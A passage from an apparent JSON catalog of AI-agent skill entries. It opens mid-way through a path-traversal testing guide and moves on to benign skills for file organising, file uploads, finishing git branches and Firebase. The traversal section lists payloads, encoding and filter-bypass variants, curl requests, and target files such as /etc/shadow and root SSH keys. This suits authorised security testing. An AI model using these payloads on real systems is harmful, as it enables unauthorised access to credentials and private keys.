      "content": "\n# File Path Traversal Testing\n\n## Purpose\n\nIdentify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.\n\n## Prerequisites\n\n### Required Tools\n- Web browser with developer tools\n- Burp Suite or OWASP ZAP\n- cURL for testing payloads\n- Wordlists for automation\n- ffuf or wfuzz for fuzzing\n\n### Required Knowledge\n- HTTP request/response structure\n- Linux and Windows filesystem layout\n- Web application architecture\n- Basic understanding of file APIs\n\n## Outputs and Deliverables\n\n1. **Vulnerability Report** - Identified traversal points and severity\n2. **Exploitation Proof** - Extracted file contents\n3. **Impact Assessment** - Accessible files and data exposure\n4. **Remediation Guidance** - Secure coding recommendations\n\n## Core Workflow\n\n### Phase 1: Understanding Path Traversal\n\nPath traversal occurs when applications use user input to construct file paths:\n\n```php\n// Vulnerable PHP code example\n$template = \"blue.php\";\nif (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {\n    $template = $_COOKIE['template'];\n}\ninclude(\"/home/user/templates/\" . $template);\n```\n\nAttack principle:\n- `../` sequence moves up one directory\n- Chain multiple sequences to reach root\n- Access files outside intended directory\n\nImpact:\n- **Confidentiality** - Read sensitive files\n- **Integrity** - Write/modify files (in some cases)\n- **Availability** - Delete files (in some cases)\n- **Code Execution** - If combined with file upload or log poisoning\n\n### Phase 2: Identifying Traversal Points\n\nMap application for potential file operations:\n\n```bash\n# Parameters that often handle files\n?file=\n?path=\n?page=\n?template=\n?filename=\n?doc=\n?document=\n?folder=\n?dir=\n?include=\n?src=\n?source=\n?content=\n?view=\n?download=\n?load=\n?read=\n?retrieve=\n```\n\nCommon vulnerable functionality:\n- Image loading: `/image?filename=23.jpg`\n- Template selection: `?template=blue.php`\n- File downloads: `/download?file=report.pdf`\n- Document viewers: `/view?doc=manual.pdf`\n- Include mechanisms: `?page=about`\n\n### Phase 3: Basic Exploitation Techniques\n\n#### Simple Path Traversal\n\n```bash\n# Basic Linux traversal\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n../../../../../../etc/passwd\n\n# Windows traversal\n..\\..\\..\\windows\\win.ini\n..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n\n# URL encoded\n..%2F..%2F..%2Fetc%2Fpasswd\n..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding\n\n# Test payloads with curl\ncurl \"http://target.com/image?filename=../../../etc/passwd\"\ncurl \"http://target.com/download?file=....//....//....//etc/passwd\"\n```\n\n#### Absolute Path Injection\n\n```bash\n# Direct absolute path (Linux)\n/etc/passwd\n/etc/shadow\n/etc/hosts\n/proc/self/environ\n\n# Direct absolute path (Windows)\nC:\\windows\\win.ini\nC:\\windows\\system32\\drivers\\etc\\hosts\nC:\\boot.ini\n```\n\n### Phase 4: Bypass Techniques\n\n#### Bypass Stripped Traversal Sequences\n\n```bash\n# When ../ is stripped once\n....//....//....//etc/passwd\n....\\/....\\/....\\/etc/passwd\n\n# Nested traversal\n..././..././..././etc/passwd\n....//....//etc/passwd\n\n# Mixed encoding\n..%2f..%2f..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n```\n\n#### Bypass Extension Validation\n\n```bash\n# Null byte injection (older PHP versions)\n../../../etc/passwd%00.jpg\n../../../etc/passwd%00.png\n\n# Path truncation\n../../../etc/passwd...............................\n\n# Double extension\n../../../etc/passwd.jpg.php\n```\n\n#### Bypass Base Directory Validation\n\n```bash\n# When path must start with expected directory\n/var/www/images/../../../etc/passwd\n\n# Expected path followed by traversal\nimages/../../../etc/passwd\n```\n\n#### Bypass Blacklist Filters\n\n```bash\n# Unicode/UTF-8 encoding\n..%c0%af..%c0%af..%c0%afetc/passwd\n..%c1%9c..%c1%9c..%c1%9cetc/passwd\n\n# Overlong UTF-8 encoding\n%c0%2e%c0%2e%c0%af\n\n# URL encoding variations\n%2e%2e/\n%2e%2e%5c\n..%5c\n..%255c\n\n# Case variations (Windows)\n....\\\\....\\\\etc\\\\passwd\n```\n\n### Phase 5: Linux Target Files\n\nHigh-value files to target:\n\n```bash\n# System files\n/etc/passwd           # User accounts\n/etc/shadow           # Password hashes (root only)\n/etc/group            # Group information\n/etc/hosts            # Host mappings\n/etc/hostname         # System hostname\n/etc/issue            # System banner\n\n# SSH files\n/root/.ssh/id_rsa           # Root private key\n/root/.ssh/authorized_keys  # Authorized keys\n/home/<user>/.ssh/id_rsa    # User private keys\n/etc/ssh/sshd_config        # SSH configuration\n\n# Web server files\n/etc/apache2/apache2.conf\n/etc/nginx/nginx.conf\n/etc/apache2/sites-enabled/000-default.conf\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n\n# Application files\n/var/www/html/config.php\n/var/www/html/wp-config.php\n/var/www/html/.htaccess\n/var",
      "tags": [
        "python",
        "pdf",
        "api",
        "ai",
        "agent",
        "automation",
        "workflow",
        "template",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:22.103Z"
    },
    {
      "id": "composio-file-organizer",
      "name": "file-organizer",
      "slug": "file-organizer",
      "description": "Intelligently organizes your files and folders across your computer by understanding context, finding duplicates, suggesting better structures, and automating cleanup tasks. Reduces cognitive load and keeps your digital workspace tidy without manual effort.",
      "category": "Productivity & Organization",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/file-organizer",
      "content": "\n# File Organizer\n\nThis skill acts as your personal organization assistant, helping you maintain a clean, logical file structure across your computer without the mental overhead of constant manual organization.\n\n## When to Use This Skill\n\n- Your Downloads folder is a chaotic mess\n- You can't find files because they're scattered everywhere\n- You have duplicate files taking up space\n- Your folder structure doesn't make sense anymore\n- You want to establish better organization habits\n- You're starting a new project and need a good structure\n- You're cleaning up before archiving old projects\n\n## What This Skill Does\n\n1. **Analyzes Current Structure**: Reviews your folders and files to understand what you have\n2. **Finds Duplicates**: Identifies duplicate files across your system\n3. **Suggests Organization**: Proposes logical folder structures based on your content\n4. **Automates Cleanup**: Moves, renames, and organizes files with your approval\n5. **Maintains Context**: Makes smart decisions based on file types, dates, and content\n6. **Reduces Clutter**: Identifies old files you probably don't need anymore\n\n## How to Use\n\n### From Your Home Directory\n\n```\ncd ~\n```\n\nThen run Claude Code and ask for help:\n\n```\nHelp me organize my Downloads folder\n```\n\n```\nFind duplicate files in my Documents folder\n```\n\n```\nReview my project directories and suggest improvements\n```\n\n### Specific Organization Tasks\n\n```\nOrganize these downloads into proper folders based on what they are\n```\n\n```\nFind duplicate files and help me decide which to keep\n```\n\n```\nClean up old files I haven't touched in 6+ months\n```\n\n```\nCreate a better folder structure for my [work/projects/photos/etc]\n```\n\n## Instructions\n\nWhen a user requests file organization help:\n\n1. **Understand the Scope**\n   \n   Ask clarifying questions:\n   - Which directory needs organization? (Downloads, Documents, entire home folder?)\n   - What's the main problem? (Can't find things, duplicates, too messy, no structure?)\n   - Any files or folders to avoid? (Current projects, sensitive data?)\n   - How aggressively to organize? (Conservative vs. comprehensive cleanup)\n\n2. **Analyze Current State**\n   \n   Review the target directory:\n   ```bash\n   # Get overview of current structure\n   ls -la [target_directory]\n   \n   # Check file types and sizes\n   find [target_directory] -type f -exec file {} \\; | head -20\n   \n   # Identify largest files\n   du -sh [target_directory]/* | sort -rh | head -20\n   \n   # Count file types\n   find [target_directory] -type f | sed 's/.*\\.//' | sort | uniq -c | sort -rn\n   ```\n   \n   Summarize findings:\n   - Total files and folders\n   - File type breakdown\n   - Size distribution\n   - Date ranges\n   - Obvious organization issues\n\n3. **Identify Organization Patterns**\n   \n   Based on the files, determine logical groupings:\n   \n   **By Type**:\n   - Documents (PDFs, DOCX, TXT)\n   - Images (JPG, PNG, SVG)\n   - Videos (MP4, MOV)\n   - Archives (ZIP, TAR, DMG)\n   - Code/Projects (directories with code)\n   - Spreadsheets (XLSX, CSV)\n   - Presentations (PPTX, KEY)\n   \n   **By Purpose**:\n   - Work vs. Personal\n   - Active vs. Archive\n   - Project-specific\n   - Reference materials\n   - Temporary/scratch files\n   \n   **By Date**:\n   - Current year/month\n   - Previous years\n   - Very old (archive candidates)\n\n4. **Find Duplicates**\n   \n   When requested, search for duplicates:\n   ```bash\n   # Find exact duplicates by hash\n   find [directory] -type f -exec md5 {} \\; | sort | uniq -d\n   \n   # Find files with same name\n   find [directory] -type f -printf '%f\\n' | sort | uniq -d\n   \n   # Find similar-sized files\n   find [directory] -type f -printf '%s %p\\n' | sort -n\n   ```\n   \n   For each set of duplicates:\n   - Show all file paths\n   - Display sizes and modification dates\n   - Recommend which to keep (usually newest or best-named)\n   - **Important**: Always ask for confirmation before deleting\n\n5. **Propose Organization Plan**\n   \n   Present a clear plan before making changes:\n   \n   ```markdown\n   # Organization Plan for [Directory]\n   \n   ## Current State\n   - X files across Y folders\n   - [Size] total\n   - File types: [breakdown]\n   - Issues: [list problems]\n   \n   ## Proposed Structure\n   \n   ```\n   [Directory]/\n   ├── Work/\n   │   ├── Projects/\n   │   ├── Documents/\n   │   └── Archive/\n   ├── Personal/\n   │   ├── Photos/\n   │   ├── Documents/\n   │   └── Media/\n   └── Downloads/\n       ├── To-Sort/\n       └── Archive/\n   ```\n   \n   ## Changes I'll Make\n   \n   1. **Create new folders**: [list]\n   2. **Move files**:\n      - X PDFs → Work/Documents/\n      - Y images → Personal/Photos/\n      - Z old files → Archive/\n   3. **Rename files**: [any renaming patterns]\n   4. **Delete**: [duplicates or trash files]\n   \n   ## Files Needing Your Decision\n   \n   - [List any files you're unsure about]\n   \n   Ready to proceed? (yes/no/modify)\n   ```\n\n6. **Execute Organization**\n   \n   After approval, organize systematically:\n   \n   ```bash\n   # Create folder structure\n   mkdir -p ",
      "tags": [
        "git",
        "pdf",
        "docx",
        "xlsx",
        "markdown",
        "cli",
        "ai",
        "claude"
      ],
      "useCases": [
        "Your Downloads folder is a chaotic mess",
        "You can't find files because they're scattered everywhere",
        "You have duplicate files taking up space",
        "Your folder structure doesn't make sense anymore",
        "You want to establish better organization habits"
      ],
      "instructions": "When a user requests file organization help:\n\n1. **Understand the Scope**\n   \n   Ask clarifying questions:\n   - Which directory needs organization? (Downloads, Documents, entire home folder?)\n   - What's the main problem? (Can't find things, duplicates, too messy, no structure?)\n   - Any files or folders to avoid? (Current projects, sensitive data?)\n   - How aggressively to organize? (Conservative vs. comprehensive cleanup)\n\n2. **Analyze Current State**\n   \n   Review the target directory:\n   ```bash\n   # Get overview of current structure\n   ls -la [target_directory]\n   \n   # Check file types and sizes\n   find [target_directory] -type f -exec file {} \\; | head -20\n   \n   # Identify largest files\n   du -sh [target_directory]/* | sort -rh | head -20\n   \n   # Count file types\n   find [target_directory] -type f | sed 's/.*\\.//' | sort | uniq -c | sort -rn\n   ```\n   \n   Summarize findings:\n   - Total files and folders\n   - File type breakdown\n   - Size distribution\n   - Date ranges\n   - Obvious organization issues\n\n3. **Identify Organization Patterns**\n   \n   Based on the files, determine logical groupings:\n   \n   **By Type**:\n   - Documents (PDFs, DOCX, TXT)\n   - Images (JPG, PNG, SVG)\n   - Videos (MP4, MOV)\n   - Archives (ZIP, TAR, DMG)\n   - Code/Projects (directories with code)\n   - Spreadsheets (XLSX, CSV)\n   - Presentations (PPTX, KEY)\n   \n   **By Purpose**:\n   - Work vs. Personal\n   - Active vs. Archive\n   - Project-specific\n   - Reference materials\n   - Temporary/scratch files\n   \n   **By Date**:\n   - Current year/month\n   - Previous years\n   - Very old (archive candidates)\n\n4. **Find Duplicates**\n   \n   When requested, search for duplicates:\n   ```bash\n   # Find exact duplicates by hash\n   find [directory] -type f -exec md5 {} \\; | sort | uniq -d\n   \n   # Find files with same name\n   find [directory] -type f -printf '%f\\n' | sort | uniq -d\n   \n   # Find similar-sized files\n   find [directory] -type f -printf '%s %p\\n' | sort -n\n   ```\n   \n   For each set of duplic",
      "scrapedAt": "2026-01-26T13:15:05.028Z"
    },
    {
      "id": "awesome-llm-file-organizer",
      "name": "file-organizer",
      "slug": "awesome-llm-file-organizer",
      "description": "Intelligently organizes your files and folders across your computer by understanding context, finding duplicates, suggesting better structures, and automating cleanup tasks. Reduces cognitive load and keeps your digital workspace tidy without manual effort.",
      "category": "Productivity & Organization",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/file-organizer",
      "content": "\n# File Organizer\n\nThis skill acts as your personal organization assistant, helping you maintain a clean, logical file structure across your computer without the mental overhead of constant manual organization.\n\n## When to Use This Skill\n\n- Your Downloads folder is a chaotic mess\n- You can't find files because they're scattered everywhere\n- You have duplicate files taking up space\n- Your folder structure doesn't make sense anymore\n- You want to establish better organization habits\n- You're starting a new project and need a good structure\n- You're cleaning up before archiving old projects\n\n## What This Skill Does\n\n1. **Analyzes Current Structure**: Reviews your folders and files to understand what you have\n2. **Finds Duplicates**: Identifies duplicate files across your system\n3. **Suggests Organization**: Proposes logical folder structures based on your content\n4. **Automates Cleanup**: Moves, renames, and organizes files with your approval\n5. **Maintains Context**: Makes smart decisions based on file types, dates, and content\n6. **Reduces Clutter**: Identifies old files you probably don't need anymore\n\n## How to Use\n\n### From Your Home Directory\n\n```\ncd ~\n```\n\nThen run Claude Code and ask for help:\n\n```\nHelp me organize my Downloads folder\n```\n\n```\nFind duplicate files in my Documents folder\n```\n\n```\nReview my project directories and suggest improvements\n```\n\n### Specific Organization Tasks\n\n```\nOrganize these downloads into proper folders based on what they are\n```\n\n```\nFind duplicate files and help me decide which to keep\n```\n\n```\nClean up old files I haven't touched in 6+ months\n```\n\n```\nCreate a better folder structure for my [work/projects/photos/etc]\n```\n\n## Instructions\n\nWhen a user requests file organization help:\n\n1. **Understand the Scope**\n   \n   Ask clarifying questions:\n   - Which directory needs organization? (Downloads, Documents, entire home folder?)\n   - What's the main problem? (Can't find things, duplicates, too messy, no structure?)\n   - Any files or folders to avoid? (Current projects, sensitive data?)\n   - How aggressively to organize? (Conservative vs. comprehensive cleanup)\n\n2. **Analyze Current State**\n   \n   Review the target directory:\n   ```bash\n   # Get overview of current structure\n   ls -la [target_directory]\n   \n   # Check file types and sizes\n   find [target_directory] -type f -exec file {} \\; | head -20\n   \n   # Identify largest files\n   du -sh [target_directory]/* | sort -rh | head -20\n   \n   # Count file types\n   find [target_directory] -type f | sed 's/.*\\.//' | sort | uniq -c | sort -rn\n   ```\n   \n   Summarize findings:\n   - Total files and folders\n   - File type breakdown\n   - Size distribution\n   - Date ranges\n   - Obvious organization issues\n\n3. **Identify Organization Patterns**\n   \n   Based on the files, determine logical groupings:\n   \n   **By Type**:\n   - Documents (PDFs, DOCX, TXT)\n   - Images (JPG, PNG, SVG)\n   - Videos (MP4, MOV)\n   - Archives (ZIP, TAR, DMG)\n   - Code/Projects (directories with code)\n   - Spreadsheets (XLSX, CSV)\n   - Presentations (PPTX, KEY)\n   \n   **By Purpose**:\n   - Work vs. Personal\n   - Active vs. Archive\n   - Project-specific\n   - Reference materials\n   - Temporary/scratch files\n   \n   **By Date**:\n   - Current year/month\n   - Previous years\n   - Very old (archive candidates)\n\n4. **Find Duplicates**\n   \n   When requested, search for duplicates:\n   ```bash\n   # Find exact duplicates by hash\n   find [directory] -type f -exec md5 {} \\; | sort | uniq -d\n   \n   # Find files with same name\n   find [directory] -type f -printf '%f\\n' | sort | uniq -d\n   \n   # Find similar-sized files\n   find [directory] -type f -printf '%s %p\\n' | sort -n\n   ```\n   \n   For each set of duplicates:\n   - Show all file paths\n   - Display sizes and modification dates\n   - Recommend which to keep (usually newest or best-named)\n   - **Important**: Always ask for confirmation before deleting\n\n5. **Propose Organization Plan**\n   \n   Present a clear plan before making changes:\n   \n   ```markdown\n   # Organization Plan for [Directory]\n   \n   ## Current State\n   - X files across Y folders\n   - [Size] total\n   - File types: [breakdown]\n   - Issues: [list problems]\n   \n   ## Proposed Structure\n   \n   ```\n   [Directory]/\n   ├── Work/\n   │   ├── Projects/\n   │   ├── Documents/\n   │   └── Archive/\n   ├── Personal/\n   │   ├── Photos/\n   │   ├── Documents/\n   │   └── Media/\n   └── Downloads/\n       ├── To-Sort/\n       └── Archive/\n   ```\n   \n   ## Changes I'll Make\n   \n   1. **Create new folders**: [list]\n   2. **Move files**:\n      - X PDFs → Work/Documents/\n      - Y images → Personal/Photos/\n      - Z old files → Archive/\n   3. **Rename files**: [any renaming patterns]\n   4. **Delete**: [duplicates or trash files]\n   \n   ## Files Needing Your Decision\n   \n   - [List any files you're unsure about]\n   \n   Ready to proceed? (yes/no/modify)\n   ```\n\n6. **Execute Organization**\n   \n   After approval, organize systematically:\n   \n   ```bash\n   # Create folder structure\n   mkdir -p ",
      "tags": [
        "pdf",
        "docx",
        "xlsx",
        "pptx",
        "markdown",
        "claude",
        "ai",
        "template",
        "video",
        "image"
      ],
      "useCases": [
        "Your Downloads folder is a chaotic mess",
        "You can't find files because they're scattered everywhere",
        "You have duplicate files taking up space",
        "Your folder structure doesn't make sense anymore",
        "You want to establish better organization habits"
      ],
      "scrapedAt": "2026-01-26T13:15:47.967Z"
    },
    {
      "id": "antigravity-file-uploads",
      "name": "file-uploads",
      "slug": "file-uploads",
      "description": "Expert at handling file uploads and cloud storage. Covers S3, Cloudflare R2, presigned URLs, multipart uploads, and image optimization. Knows how to handle large files without blocking. Use when: file upload, S3, R2, presigned URL, multipart.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/file-uploads",
      "content": "\n# File Uploads & Storage\n\n**Role**: File Upload Specialist\n\nCareful about security and performance. Never trusts file\nextensions. Knows that large uploads need special handling.\nPrefers presigned URLs over server proxying.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Trusting client-provided file type | critical | # CHECK MAGIC BYTES |\n| No upload size restrictions | high | # SET SIZE LIMITS |\n| User-controlled filename allows path traversal | critical | # SANITIZE FILENAMES |\n| Presigned URL shared or cached incorrectly | medium | # CONTROL PRESIGNED URL DISTRIBUTION |\n",
      "tags": [
        "image",
        "security",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:23.473Z"
    },
    {
      "id": "superpowers-finishing-a-development-branch",
      "name": "finishing-a-development-branch",
      "slug": "superpowers-finishing-a-development-branch",
      "description": "Use when implementation is complete, all tests pass, and you need to decide how to integrate the work - guides completion of development work by presenting structured options for merge, PR, or cleanup",
      "category": "Development & Code Tools",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/finishing-a-development-branch",
      "content": "\n# Finishing a Development Branch\n\n## Overview\n\nGuide completion of development work by presenting clear options and handling chosen workflow.\n\n**Core principle:** Verify tests → Present options → Execute choice → Clean up.\n\n**Announce at start:** \"I'm using the finishing-a-development-branch skill to complete this work.\"\n\n## The Process\n\n### Step 1: Verify Tests\n\n**Before presenting options, verify tests pass:**\n\n```bash\n# Run project's test suite\nnpm test / cargo test / pytest / go test ./...\n```\n\n**If tests fail:**\n```\nTests failing (<N> failures). Must fix before completing:\n\n[Show failures]\n\nCannot proceed with merge/PR until tests pass.\n```\n\nStop. Don't proceed to Step 2.\n\n**If tests pass:** Continue to Step 2.\n\n### Step 2: Determine Base Branch\n\n```bash\n# Try common base branches\ngit merge-base HEAD main 2>/dev/null || git merge-base HEAD master 2>/dev/null\n```\n\nOr ask: \"This branch split from main - is that correct?\"\n\n### Step 3: Present Options\n\nPresent exactly these 4 options:\n\n```\nImplementation complete. What would you like to do?\n\n1. Merge back to <base-branch> locally\n2. Push and create a Pull Request\n3. Keep the branch as-is (I'll handle it later)\n4. Discard this work\n\nWhich option?\n```\n\n**Don't add explanation** - keep options concise.\n\n### Step 4: Execute Choice\n\n#### Option 1: Merge Locally\n\n```bash\n# Switch to base branch\ngit checkout <base-branch>\n\n# Pull latest\ngit pull\n\n# Merge feature branch\ngit merge <feature-branch>\n\n# Verify tests on merged result\n<test command>\n\n# If tests pass\ngit branch -d <feature-branch>\n```\n\nThen: Cleanup worktree (Step 5)\n\n#### Option 2: Push and Create PR\n\n```bash\n# Push branch\ngit push -u origin <feature-branch>\n\n# Create PR\ngh pr create --title \"<title>\" --body \"$(cat <<'EOF'\n## Summary\n<2-3 bullets of what changed>\n\n## Test Plan\n- [ ] <verification steps>\nEOF\n)\"\n```\n\nThen: Cleanup worktree (Step 5)\n\n#### Option 3: Keep As-Is\n\nReport: \"Keeping branch <name>. Worktree preserved at <path>.\"\n\n**Don't cleanup worktree.**\n\n#### Option 4: Discard\n\n**Confirm first:**\n```\nThis will permanently delete:\n- Branch <name>\n- All commits: <commit-list>\n- Worktree at <path>\n\nType 'discard' to confirm.\n```\n\nWait for exact confirmation.\n\nIf confirmed:\n```bash\ngit checkout <base-branch>\ngit branch -D <feature-branch>\n```\n\nThen: Cleanup worktree (Step 5)\n\n### Step 5: Cleanup Worktree\n\n**For Options 1, 2, 4:**\n\nCheck if in worktree:\n```bash\ngit worktree list | grep $(git branch --show-current)\n```\n\nIf yes:\n```bash\ngit worktree remove <worktree-path>\n```\n\n**For Option 3:** Keep worktree.\n\n## Quick Reference\n\n| Option | Merge | Push | Keep Worktree | Cleanup Branch |\n|--------|-------|------|---------------|----------------|\n| 1. Merge locally | ✓ | - | - | ✓ |\n| 2. Create PR | - | ✓ | ✓ | - |\n| 3. Keep as-is | - | - | ✓ | - |\n| 4. Discard | - | - | - | ✓ (force) |\n\n## Common Mistakes\n\n**Skipping test verification**\n- **Problem:** Merge broken code, create failing PR\n- **Fix:** Always verify tests before offering options\n\n**Open-ended questions**\n- **Problem:** \"What should I do next?\" → ambiguous\n- **Fix:** Present exactly 4 structured options\n\n**Automatic worktree cleanup**\n- **Problem:** Remove worktree when might need it (Option 2, 3)\n- **Fix:** Only cleanup for Options 1 and 4\n\n**No confirmation for discard**\n- **Problem:** Accidentally delete work\n- **Fix:** Require typed \"discard\" confirmation\n\n## Red Flags\n\n**Never:**\n- Proceed with failing tests\n- Merge without verifying tests on result\n- Delete work without confirmation\n- Force-push without explicit request\n\n**Always:**\n- Verify tests before offering options\n- Present exactly 4 options\n- Get typed confirmation for Option 4\n- Clean up worktree for Options 1 & 4 only\n\n## Integration\n\n**Called by:**\n- **subagent-driven-development** (Step 7) - After all tasks complete\n- **executing-plans** (Step 5) - After all batches complete\n\n**Pairs with:**\n- **using-git-worktrees** - Cleans up worktree created by that skill\n",
      "tags": [
        "git",
        "worktree",
        "subagent",
        "workflow",
        "agent",
        "verification",
        "finishing",
        "development",
        "branch"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:14.238Z"
    },
    {
      "id": "antigravity-finishing-a-development-branch",
      "name": "finishing-a-development-branch",
      "slug": "finishing-a-development-branch",
      "description": "Use when implementation is complete, all tests pass, and you need to decide how to integrate the work - guides completion of development work by presenting structured options for merge, PR, or cleanup",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/finishing-a-development-branch",
      "content": "\n# Finishing a Development Branch\n\n## Overview\n\nGuide completion of development work by presenting clear options and handling chosen workflow.\n\n**Core principle:** Verify tests → Present options → Execute choice → Clean up.\n\n**Announce at start:** \"I'm using the finishing-a-development-branch skill to complete this work.\"\n\n## The Process\n\n### Step 1: Verify Tests\n\n**Before presenting options, verify tests pass:**\n\n```bash\n# Run project's test suite\nnpm test / cargo test / pytest / go test ./...\n```\n\n**If tests fail:**\n```\nTests failing (<N> failures). Must fix before completing:\n\n[Show failures]\n\nCannot proceed with merge/PR until tests pass.\n```\n\nStop. Don't proceed to Step 2.\n\n**If tests pass:** Continue to Step 2.\n\n### Step 2: Determine Base Branch\n\n```bash\n# Try common base branches\ngit merge-base HEAD main 2>/dev/null || git merge-base HEAD master 2>/dev/null\n```\n\nOr ask: \"This branch split from main - is that correct?\"\n\n### Step 3: Present Options\n\nPresent exactly these 4 options:\n\n```\nImplementation complete. What would you like to do?\n\n1. Merge back to <base-branch> locally\n2. Push and create a Pull Request\n3. Keep the branch as-is (I'll handle it later)\n4. Discard this work\n\nWhich option?\n```\n\n**Don't add explanation** - keep options concise.\n\n### Step 4: Execute Choice\n\n#### Option 1: Merge Locally\n\n```bash\n# Switch to base branch\ngit checkout <base-branch>\n\n# Pull latest\ngit pull\n\n# Merge feature branch\ngit merge <feature-branch>\n\n# Verify tests on merged result\n<test command>\n\n# If tests pass\ngit branch -d <feature-branch>\n```\n\nThen: Cleanup worktree (Step 5)\n\n#### Option 2: Push and Create PR\n\n```bash\n# Push branch\ngit push -u origin <feature-branch>\n\n# Create PR\ngh pr create --title \"<title>\" --body \"$(cat <<'EOF'\n## Summary\n<2-3 bullets of what changed>\n\n## Test Plan\n- [ ] <verification steps>\nEOF\n)\"\n```\n\nThen: Cleanup worktree (Step 5)\n\n#### Option 3: Keep As-Is\n\nReport: \"Keeping branch <name>. Worktree preserved at <path>.\"\n\n**Don't cleanup worktree.**\n\n#### Option 4: Discard\n\n**Confirm first:**\n```\nThis will permanently delete:\n- Branch <name>\n- All commits: <commit-list>\n- Worktree at <path>\n\nType 'discard' to confirm.\n```\n\nWait for exact confirmation.\n\nIf confirmed:\n```bash\ngit checkout <base-branch>\ngit branch -D <feature-branch>\n```\n\nThen: Cleanup worktree (Step 5)\n\n### Step 5: Cleanup Worktree\n\n**For Options 1, 2, 4:**\n\nCheck if in worktree:\n```bash\ngit worktree list | grep $(git branch --show-current)\n```\n\nIf yes:\n```bash\ngit worktree remove <worktree-path>\n```\n\n**For Option 3:** Keep worktree.\n\n## Quick Reference\n\n| Option | Merge | Push | Keep Worktree | Cleanup Branch |\n|--------|-------|------|---------------|----------------|\n| 1. Merge locally | ✓ | - | - | ✓ |\n| 2. Create PR | - | ✓ | ✓ | - |\n| 3. Keep as-is | - | - | ✓ | - |\n| 4. Discard | - | - | - | ✓ (force) |\n\n## Common Mistakes\n\n**Skipping test verification**\n- **Problem:** Merge broken code, create failing PR\n- **Fix:** Always verify tests before offering options\n\n**Open-ended questions**\n- **Problem:** \"What should I do next?\" → ambiguous\n- **Fix:** Present exactly 4 structured options\n\n**Automatic worktree cleanup**\n- **Problem:** Remove worktree when might need it (Option 2, 3)\n- **Fix:** Only cleanup for Options 1 and 4\n\n**No confirmation for discard**\n- **Problem:** Accidentally delete work\n- **Fix:** Require typed \"discard\" confirmation\n\n## Red Flags\n\n**Never:**\n- Proceed with failing tests\n- Merge without verifying tests on result\n- Delete work without confirmation\n- Force-push without explicit request\n\n**Always:**\n- Verify tests before offering options\n- Present exactly 4 options\n- Get typed confirmation for Option 4\n- Clean up worktree for Options 1 & 4 only\n\n## Integration\n\n**Called by:**\n- **subagent-driven-development** (Step 7) - After all tasks complete\n- **executing-plans** (Step 5) - After all batches complete\n\n**Pairs with:**\n- **using-git-worktrees** - Cleans up worktree created by that skill\n",
      "tags": [
        "ai",
        "agent",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:25.041Z"
    },
    {
      "id": "antigravity-firebase",
      "name": "firebase",
      "slug": "firebase",
      "description": "Firebase gives you a complete backend in minutes - auth, database, storage, functions, hosting. But the ease of setup hides real complexity. Security rules are your last line of defense, and they're often wrong. Firestore queries are limited, and you learn this after you've designed your data model.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/firebase",
      "content": "\n# Firebase\n\nYou're a developer who has shipped dozens of Firebase projects. You've seen the\n\"easy\" path lead to security breaches, runaway costs, and impossible migrations.\nYou know Firebase is powerful, but you also know its sharp edges.\n\nYour hard-won lessons: The team that skipped security rules got pwned. The team\nthat designed Firestore like SQL couldn't query their data. The team that\nattached listeners to large collections got a $10k bill. You've learned from\nall of them.\n\nYou advocate for Firebase w\n\n## Capabilities\n\n- firebase-auth\n- firestore\n- firebase-realtime-database\n- firebase-cloud-functions\n- firebase-storage\n- firebase-hosting\n- firebase-security-rules\n- firebase-admin-sdk\n- firebase-emulators\n\n## Patterns\n\n### Modular SDK Import\n\nImport only what you need for smaller bundles\n\n### Security Rules Design\n\nSecure your data with proper rules from day one\n\n### Data Modeling for Queries\n\nDesign Firestore data structure around query patterns\n\n## Anti-Patterns\n\n### ❌ No Security Rules\n\n### ❌ Client-Side Admin Operations\n\n### ❌ Listener on Large Collections\n\n## Related Skills\n\nWorks well with: `nextjs-app-router`, `react-patterns`, `authentication-oauth`, `stripe`\n",
      "tags": [
        "react",
        "nextjs",
        "design",
        "security",
        "firebase",
        "stripe",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:26.302Z"
    },
    {
      "id": "antigravity-firecrawl-scraper",
      "name": "firecrawl-scraper",
      "slug": "firecrawl-scraper",
      "description": "Deep web scraping, screenshots, PDF parsing, and website crawling using Firecrawl API",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/firecrawl-scraper",
